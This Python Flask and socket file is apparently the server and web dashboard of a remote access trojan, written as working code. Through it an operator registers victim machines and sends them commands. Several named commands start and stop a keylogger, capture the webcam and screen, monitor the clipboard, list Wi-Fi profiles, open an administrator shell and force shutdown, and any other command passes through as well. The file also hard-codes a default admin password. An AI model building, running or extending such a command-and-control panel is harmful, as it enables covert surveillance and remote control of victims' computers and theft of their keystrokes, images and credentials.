import socket
import json
import threading
import os
import time
import uuid
from flask import Flask, request, render_template, redirect, url_for, session, flash
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
from queue import Queue
import re

# Server configuration
SERVER_IP = '0.0.0.0'  # Listen on all interfaces
WEB_PORT = int(os.environ.get('PORT', 8080))  # Port for Flask web interface (Railway compatible)
SERVER_PORT = 5000     # TCP port for client connections (only works locally)
RAILWAY_MODE = os.environ.get('RAILWAY_ENVIRONMENT') is not None  # Detect Railway deployment
SECRET_KEY = os.environ.get('SECRET_KEY', 'pablosboson_secret_key_2024')  # Use environment variable for production

# Global variables
connected_clients = {}  # Dictionary to store client_id: socket pairs
web_clients = {}  # Dictionary to store web-based clients
clients_lock = threading.Lock()  # Lock for thread-safe client management
command_queue = Queue()  # Queue for pending commands
response_queue = Queue()  # Queue for client responses
web_command_queue = {}  # Dictionary to store commands for web clients
web_results = {}  # Dictionary to store results from web clients

# User credentials - in a real app, this would be in a database
# Default credentials: admin / pablosboson2024
USERS = {
    'admin': {
        'password': generate_password_hash('pablosboson2024'),
        'role': 'admin'
    }
}

app = Flask(__name__)
app.secret_key = SECRET_KEY

# Initialize Flask-Login
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'
login_manager.login_message = 'Please log in to access this page.'
login_manager.login_message_category = 'info'

# User class for Flask-Login
class User(UserMixin):
    def __init__(self, id, role):
        self.id = id
        self.role = role

@login_manager.user_loader
def load_user(user_id):
    if user_id in USERS:
        return User(user_id, USERS[user_id]['role'])
    return None

class ClientHandler(threading.Thread):
    def __init__(self, client_socket, address):
        super().__init__()
        self.client_socket = client_socket
        self.address = address
        self.running = True
        self.client_id = None

    def run(self):
        buffer = b''  # Buffer to accumulate data
        try:
            while self.running:
                chunk = self.client_socket.recv(8192)  # Larger buffer
                if not chunk:
                    break
                
                buffer += chunk
                
                # Process complete messages in the buffer
                while buffer:
                    try:
                        # Try to decode and parse as JSON
                        try:
                            decoded_data = buffer.decode('utf-8', errors='replace')
                        except UnicodeDecodeError:
                            decoded_data = buffer.decode('latin-1', errors='replace')
                        
                        message = json.loads(decoded_data)
                        
                        # If we got here, we have a complete valid JSON message
                        message_type = message.get('type')
                        message_data = message.get('data')
                        
                        # Process the message
                        if message_type == 'system_info':
                            # Register client with hostname and IP
                            self.client_id = f"{message_data['basic']['hostname']}@{self.address[0]}"
                            with clients_lock:
                                connected_clients[self.client_id] = {
                                    'socket': self.client_socket,
                                    'system_info': message_data
                                }
                            print(f"New client connected: {self.client_id}")

                        elif message_type == 'command_result':
                            # Store command output
                            command = message.get('command', 'unknown')
                            # Truncate very long outputs to prevent UI issues
                            if isinstance(message_data, str) and len(message_data) > 50000:
                                message_data = message_data[:50000] + "\n\n[Output truncated due to size...]"
                            response_queue.put((self.client_id, message_data, command))

                        elif message_type == 'keylog_data':
                            # Store keylog data
                            response_queue.put((self.client_id, f"Keylog: {message_data}", "keylog"))
                            
                        elif message_type == 'webcam_image':
                            # Handle webcam image
                            image_data = message.get('image_data')
                            if image_data:
                                # Store the notification that an image was captured
                                response_queue.put((self.client_id, f"Webcam image captured successfully. Displaying image...", "capture_webcam"))
                                # Store the image data separately
                                response_queue.put((self.client_id, image_data, "webcam_image"))
                            else:
                                response_queue.put((self.client_id, f"Error: No image data received", "capture_webcam"))
                                
                        elif message_type == 'screenshot_image':
                            # Handle screenshot image
                            image_data = message.get('image_data')
                            if image_data:
                                # Store the notification that a screenshot was captured
                                response_queue.put((self.client_id, f"Screenshot captured successfully. Displaying image...", "capture_screenshot"))
                                # Store the image data separately
                                response_queue.put((self.client_id, image_data, "screenshot_image"))
                            else:
                                response_queue.put((self.client_id, f"Error: No screenshot data received", "capture_screenshot"))
                                
                        elif message_type == 'clipboard_data':
                            # Handle clipboard data updates
                            timestamp = message.get('timestamp', time.time())
                            formatted_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
                            
                            # Handle new clipboard data format (dictionary with type and content)
                            if isinstance(message_data, dict):
                                content_type = message_data.get('content_type', 'unknown')
                                content = message_data.get('content', '')
                                formats = message_data.get('formats', [])
                                
                                # Format the clipboard data based on content type
                                if content_type == 'text':
                                    clipboard_display = f"Clipboard updated at {formatted_time} (Text):\n{content}"
                                elif content_type == 'image':
                                    # For images, we store both the notification and the image data
                                    clipboard_display = f"Clipboard updated at {formatted_time} (Image)"
                                    # Store the image data separately
                                    response_queue.put((self.client_id, content, "clipboard_image"))
                                elif content_type == 'files':
                                    clipboard_display = f"Clipboard updated at {formatted_time} (Files):\n{content}"
                                else:
                                    # Format available formats as a list
                                    format_list = "\n".join([f"- {fmt.get('name', 'Unknown')} (ID: {fmt.get('id', 'N/A')})" for fmt in formats[:10]])
                                    if len(formats) > 10:
                                        format_list += f"\n- ... and {len(formats) - 10} more formats"
                                    
                                    clipboard_display = f"Clipboard updated at {formatted_time} ({content_type}):\n{content}\n\nAvailable formats:\n{format_list if format_list else 'None'}"
                            else:
                                # Handle legacy format (string)
                                clipboard_display = f"Clipboard updated at {formatted_time}:\n{message_data}"
                            
                            response_queue.put((self.client_id, clipboard_display, "clipboard_data"))

                        elif message_type == 'error':
                            # Store error messages
                            response_queue.put((self.client_id, f"Error: {message_data}", "error"))
                        
                        # Clear the buffer as we've processed the message
                        buffer = b''
                        break
                        
                    except json.JSONDecodeError as e:
                        # If we get a JSONDecodeError, it could be because:
                        # 1. The message is incomplete - wait for more data
                        # 2. The message is corrupted - try to recover
                        
                        if "Expecting value" in str(e) and buffer.startswith(b'{'):
                            # Likely an incomplete message, wait for more data
                            break
                        elif "Unterminated string" in str(e):
                            # Likely an incomplete message, wait for more data
                            break
                        else:
                            # Try to find the next valid JSON object
                            try:
                                # Look for the start of a new JSON object
                                next_start = buffer.find(b'{', 1)
                                if next_start > 0:
                                    # Discard data up to the next JSON start
                                    print(f"Discarding corrupted data: {buffer[:next_start]}")
                                    buffer = buffer[next_start:]
                                else:
                                    # If no new JSON start found, discard everything
                                    print(f"Invalid JSON from {self.address}, discarding: {buffer[:100]}...")
                                    buffer = b''
                                    break
                            except Exception as recovery_error:
                                print(f"Error recovering from bad JSON: {recovery_error}")
                                buffer = b''
                                break
                    except Exception as e:
                        print(f"Error processing message from {self.address}: {e}")
                        buffer = b''
                        break
                
        except Exception as e:
            print(f"Client handler error: {e}")
        finally:
            # Clean up on disconnect
            if self.client_id:
                with clients_lock:
                    if self.client_id in connected_clients:
                        del connected_clients[self.client_id]
            self.client_socket.close()
            print(f"Client disconnected: {self.address}")

def start_server():
    """Start the TCP server to accept client connections"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((SERVER_IP, SERVER_PORT))
    server.listen(5)
    print(f"Server listening on {SERVER_IP}:{SERVER_PORT}")

    while True:
        try:
            client_socket, address = server.accept()
            print(f"New connection from {address}")
            handler = ClientHandler(client_socket, address)
            handler.start()
        except Exception as e:
            print(f"Server error: {e}")

def validate_command(command):
    """Basic command validation to prevent injection"""
    # Allow only alphanumeric, spaces, and specific safe characters
    safe_pattern = r'^[a-zA-Z0-9\s\-_/\\:.*+=]+$'
    return bool(re.match(safe_pattern, command))

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Handle user login"""
    if current_user.is_authenticated:
        return redirect(url_for('index'))
        
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username in USERS and check_password_hash(USERS[username]['password'], password):
            user = User(username, USERS[username]['role'])
            login_user(user)
            next_page = request.args.get('next')
            return redirect(next_page or url_for('index'))
        else:
            error = 'Invalid username or password'
    
    return render_template('login.html', error=error)

@app.route('/logout')
@login_required
def logout():
    """Handle user logout"""
    logout_user()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def index():
    """Render the web dashboard"""
    return render_template('dashboard_new.html')

@app.route('/clients')
@login_required
def get_clients():
    """Return list of connected clients with basic info"""
    with clients_lock:
        # TCP clients
        tcp_clients = [
            {
                'id': client_id,
                'hostname': connected_clients[client_id]['system_info']['basic']['hostname'],
                'ip': connected_clients[client_id]['system_info']['network']['ip_address'],
                'type': 'TCP'
            }
            for client_id in connected_clients
        ]
        
        # Web clients
        web_clients_list = [
            {
                'id': client_id,
                'hostname': web_clients[client_id]['system_info']['basic']['hostname'],
                'ip': 'Web Client',
                'type': 'Web',
                'last_seen': web_clients[client_id]['last_seen']
            }
            for client_id in web_clients
        ]
        
        all_clients = tcp_clients + web_clients_list
    return {'clients': all_clients}

@app.route('/client_info/<client_id>')
@login_required
def get_client_info(client_id):
    """Return detailed system info for a specific client"""
    with clients_lock:
        # Check TCP clients first
        if client_id in connected_clients:
            return {'system_info': connected_clients[client_id]['system_info']}
        # Check web clients
        elif client_id in web_clients:
            return {'system_info': web_clients[client_id]['system_info']}
        else:
            return {'error': 'Client not found'}, 404

@app.route('/command', methods=['POST'])
@login_required
def send_command():
    """Send a command to a specific client"""
    client_id = request.form.get('client_id')
    command = request.form.get('command')

    if not client_id or not command:
        return {'status': 'error', 'message': 'Missing client_id or command'}, 400

    if not validate_command(command):
        return {'status': 'error', 'message': 'Invalid command'}, 400

    with clients_lock:
        # Check if it's a TCP client
        if client_id in connected_clients:
            try:
                # Handle TCP client (existing code)
                command_map = {
                    'shutdown': 'shutdown /s /t 0',
                    'keylog_start': {'type': 'keylog_start', 'data': ''},
                    'keylog_stop': {'type': 'keylog_stop', 'data': ''},
                    'open_cmd': 'cmd.exe',
                    'open_cmd_admin': 'runas /user:Administrator cmd.exe',
                    'open_calculator': 'calc.exe',
                    'open_notepad': 'notepad.exe',
                    'get_owner': 'net user %USERNAME%',
                    'tasklist': 'tasklist',
                    'get_wifi_passwords': 'netsh wlan show profiles',
                    'capture_webcam': {'type': 'capture_webcam', 'data': ''},
                    'capture_screenshot': {'type': 'capture_screenshot', 'data': ''},
                    'clipboard_start': {'type': 'clipboard_start', 'data': ''},
                    'clipboard_stop': {'type': 'clipboard_stop', 'data': ''},
                    'clipboard_get': {'type': 'clipboard_get', 'data': ''}
                }

                if command in command_map:
                    if isinstance(command_map[command], dict):
                        message = command_map[command]
                    else:
                        message = {'type': 'command', 'data': command_map[command]}
                else:
                    message = {'type': 'command', 'data': command}

                try:
                    json_data = json.dumps(message, ensure_ascii=True)
                    connected_clients[client_id]['socket'].sendall(json_data.encode('utf-8'))
                    return {'status': 'success', 'message': 'Command sent to TCP client'}
                except Exception as e:
                    print(f"Error sending command to TCP client {client_id}: {e}")
                    return {'status': 'error', 'message': f'Error sending command: {str(e)}'}, 500
            except Exception as e:
                return {'status': 'error', 'message': str(e)}, 500
                
        # Check if it's a web client
        elif client_id in web_clients:
            try:
                # Add command to web client queue
                command_id = str(uuid.uuid4())[:8]
                command_data = {
                    'command_id': command_id,
                    'command': command,
                    'timestamp': time.time()
                }
                
                if client_id not in web_command_queue:
                    web_command_queue[client_id] = []
                web_command_queue[client_id].append(command_data)
                
                print(f"Queued command for web client {client_id}: {command}")
                return {'status': 'success', 'message': 'Command queued for web client'}
                
            except Exception as e:
                print(f"Error queuing command for web client {client_id}: {e}")
                return {'status': 'error', 'message': f'Error queuing command: {str(e)}'}, 500
        else:
            return {'status': 'error', 'message': 'Client not found'}, 404

@app.route('/responses')
@login_required
def get_responses():
    """Return collected responses from clients"""
    responses = []
    while not response_queue.empty():
        responses.append(response_queue.get())
    
    # Also check web client results
    web_responses = []
    with clients_lock:
        for client_id, results in list(web_results.items()):
            for result in results:
                web_responses.append((client_id, result['result'], result['command']))
            web_results[client_id] = []  # Clear processed results
    
    responses.extend(web_responses)
    return {'responses': responses}

# API endpoints for web-based clients
@app.route('/api/register_client', methods=['POST'])
def register_web_client():
    """Register a web-based client"""
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        system_info = data.get('system_info')
        
        if not client_id:
            return {'error': 'Missing client_id'}, 400
            
        with clients_lock:
            web_clients[client_id] = {
                'system_info': system_info,
                'last_seen': time.time(),
                'connection_type': 'web'
            }
            # Initialize command queue for this client
            if client_id not in web_command_queue:
                web_command_queue[client_id] = []
            if client_id not in web_results:
                web_results[client_id] = []
                
        print(f"Web client registered: {client_id}")
        return {'status': 'registered', 'client_id': client_id}
        
    except Exception as e:
        print(f"Error registering web client: {e}")
        return {'error': str(e)}, 500

@app.route('/api/get_commands/<client_id>', methods=['GET'])
def get_commands_for_client(client_id):
    """Get pending commands for a specific client"""
    try:
        with clients_lock:
            if client_id not in web_clients:
                return {'error': 'Client not found'}, 404
                
            # Update last seen
            web_clients[client_id]['last_seen'] = time.time()
            
            # Get pending commands
            commands = web_command_queue.get(client_id, [])
            web_command_queue[client_id] = []  # Clear the queue
            
        return {'commands': commands}
        
    except Exception as e:
        print(f"Error getting commands for {client_id}: {e}")
        return {'error': str(e)}, 500

@app.route('/api/command_result', methods=['POST'])
def receive_command_result():
    """Receive command result from web client"""
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        command = data.get('command')
        result = data.get('result')
        command_id = data.get('command_id')
        
        if not all([client_id, command, result]):
            return {'error': 'Missing required fields'}, 400
            
        with clients_lock:
            if client_id not in web_results:
                web_results[client_id] = []
            web_results[client_id].append({
                'command': command,
                'result': result,
                'command_id': command_id,
                'timestamp': time.time()
            })
            
        print(f"Received result from {client_id} for command: {command}")
        return {'status': 'received'}
        
    except Exception as e:
        print(f"Error receiving command result: {e}")
        return {'error': str(e)}, 500

@app.route('/api/heartbeat', methods=['POST'])
def web_client_heartbeat():
    """Receive heartbeat from web client"""
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        
        if not client_id:
            return {'error': 'Missing client_id'}, 400
            
        with clients_lock:
            if client_id in web_clients:
                web_clients[client_id]['last_seen'] = time.time()
                return {'status': 'received'}
            else:
                return {'error': 'Client not registered'}, 404
                
    except Exception as e:
        print(f"Error processing heartbeat: {e}")
        return {'error': str(e)}, 500

if __name__ == '__main__':
    # Start TCP server in a separate thread (only for local development)
    if not RAILWAY_MODE:
        server_thread = threading.Thread(target=start_server, daemon=True)
        server_thread.start()
        print(f"TCP server started on {SERVER_IP}:{SERVER_PORT}")
    else:
        print("Railway mode detected - TCP server disabled (web interface only)")
    
    # Print login information
    print("=" * 50)
    print("Server started successfully!")
    if RAILWAY_MODE:
        print("Web interface will be available at your Railway URL")
    else:
        print(f"Access the web interface at: http://localhost:{WEB_PORT}")
    print("Login credentials:")
    print("  Username: admin")
    print("  Password: pablosboson2024")
    if RAILWAY_MODE:
        print("Note: Client connections disabled in Railway mode")
    print("=" * 50)
    
    # Start Flask web interface with SSL support
    try:
        # Try to use SSL if certificates exist
        if os.path.exists('server/key.pem') and os.path.exists('server/cert.pem'):
            app.run(
                host=SERVER_IP, 
                port=WEB_PORT, 
                debug=False,
                ssl_context=('server/cert.pem', 'server/key.pem')
            )
        else:
            # Fall back to HTTP if no certificates
            print("SSL certificates not found. Running in HTTP mode.")
            app.run(host=SERVER_IP, port=WEB_PORT, debug=False)
    except Exception as e:
        print(f"Error starting web server: {e}")
        print("Falling back to HTTP mode.")
        app.run(host=SERVER_IP, port=WEB_PORT, debug=False)